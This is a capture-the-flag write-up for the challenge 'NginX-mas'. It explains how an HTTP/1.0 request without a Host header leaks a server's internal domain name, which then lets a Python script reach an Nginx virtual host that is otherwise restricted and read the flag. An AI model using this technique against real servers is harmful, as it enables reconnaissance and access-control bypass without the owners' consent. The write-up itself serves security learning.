## NginX-mas  

<img src="images/chall.png" width=600>

We are given a simple webapp that has two endpoints - `/h` that outputs the request headers and `/f` that returns the flag.  

```js
const express = require('express');
const app = express();
const port = 3333;

app.get('/h', (req, res) => {
	res.json(req.headers);
});

app.get('/f', (req, res) => {
	res.send(process.env.FLAG);
});

app.listen(port, () => {
  console.log(`Server is running at http://localhost:${port}`);
});
```

The Nginx configuration of the server is the main challenge. Access to `/h` is unrestricted, but `/f` only accepts requests with the `HOST` header set to a redacted domain name.  

```nginx
server {
        listen 80 default_server;
		server_name ivy.$DOMAIN;

        location /h {
			proxy_pass http://localhost:3333;
			proxy_set_header Host $host;
			proxy_set_header X-Real-IP $remote_addr;
			proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
			proxy_set_header X-Forwarded-Proto $scheme;
        }
}

server {
        listen 80;
		server_name yvi.$DOMAIN;
		
        location /f {
			proxy_pass http://localhost:3333;
			proxy_set_header Host $host;
			proxy_set_header X-Real-IP $remote_addr;
			proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
			proxy_set_header X-Forwarded-Proto $scheme;
        }
}
```

Since we need to leak the domain name somehow, this hints towards a `HTTP 1.0` exploit.  

In `HTTP 1.0`, the `HOST` header is optional, and sending a request without the `HOST` header will get the server to reveal its internal domain name.  

```http
GET /h HTTP/1.0
```

```json
{"host":"ivy.adsfqqpoiuasfdkjlfsadq.com","x-real-ip":"118.189.231.234","x-forwarded-for":"118.189.231.234","x-forwarded-proto":"http","connection":"close"}
```

We can then visit `/f` with the domain name under the `HOST` header to get the flag.  

```python
import requests

res = requests.get(F'http://{host}:{port}/f', headers={
    'Host': 'yvi.adsfqqpoiuasfdkjlfsadq.com'
})

print(res.text)
```

Flag: `DH{play_nginx_http<1.1}`